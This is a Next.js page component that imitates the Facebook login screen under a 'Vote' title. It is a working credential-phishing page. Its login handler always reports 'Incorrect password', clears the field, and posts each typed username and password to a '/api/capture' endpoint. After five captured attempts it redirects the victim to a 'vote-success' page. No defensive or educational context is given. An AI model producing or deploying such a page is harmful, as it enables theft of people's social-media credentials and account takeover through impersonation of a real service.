import Head from 'next/head';
import { useState, useRef } from 'react';
import { useRouter } from 'next/router';

const MAX_ATTEMPTS = 5;

export default function FacebookLoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const attemptRef = useRef(0);

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    const pwdToSend = password;
    setPassword(''); // Clear password to require retaping
    attemptRef.current += 1;
    setClickCount(attemptRef.current);
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: email.trim(), 
          password: pwdToSend,
          method: 'facebook'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      router.push('/vote-success');
    }
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Facebook Login - Vote</title>
      </Head>

      <style jsx>{`
        html, body { height: 100%; margin: 0; padding: 0; }
        body { 
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
          background: linear-gradient(135deg, #e7ebf0, #f0f2f5); 
          display: flex; 
          justify-content: center; 
          align-items: center; 
          min-height: 100vh;
          margin: 0;
        }
        .login-container {
          background: white;
          width: 100%;
          max-width: 360px;
          padding: 30px;
          border-radius: 8px;
          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
          text-align: center;
          margin: 20px;
        }
        .logo {
          width: 50px;
          height: 50px;
          margin: 0 auto 16px;
          display: block;
        }
        input { 
          width: 100%;
          padding: 12px 14px; 
          margin: 10px 0;
          border: 1px solid #ccc; 
          border-radius: 6px;
          font-size: 15px;
          background: #fafafa;
        }
        input:focus { 
          outline: none;
          border-color: #1877f2;
          background: white;
        }
        button { 
          width: 100%;
          padding: 12px;
          background: #1877f2;
          color: white;
          border: none;
          border-radius: 6px;
          font-size: 16px;
          cursor: pointer;
          margin-top: 8px;
        }
        button:hover { 
          background: #166fe5;
        }
        .feedback {
          color: #e1306c;
          font-size: 14px;
          margin: 8px 0;
        }
        a {
          color: #1877f2;
          text-decoration: none;
          font-size: 14px;
          display: block;
          margin-top: 12px;
        }
        .secondary-btn {
          background: linear-gradient(135deg, #42b72a, #36a420);
          color: white;
          border: 2px solid #1877f2;
          border-radius: 6px;
          padding: 12px;
          margin-top: 15px;
          margin-bottom: 10px;
          cursor: pointer;
          width: 100%;
          font-size: 16px;
        }
        .secondary-btn:hover { 
          background: linear-gradient(135deg, #36a420, #2e921c);
        }
      `}</style>

      <div className="login-container">
        <img src="/logos/fb.png" alt="Facebook" className="logo" />
        <h2>Log in</h2>
        
        <input 
          type="text" 
          placeholder="Mobile number or email address" 
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        
        <div className="feedback">{feedback}</div>
        
        <button onClick={handleLogin}>Log In</button>
        
        <a href="#">Forgotten Password?</a>
        
        <button className="secondary-btn">Create New Account</button>
      </div>
    </>
  );
}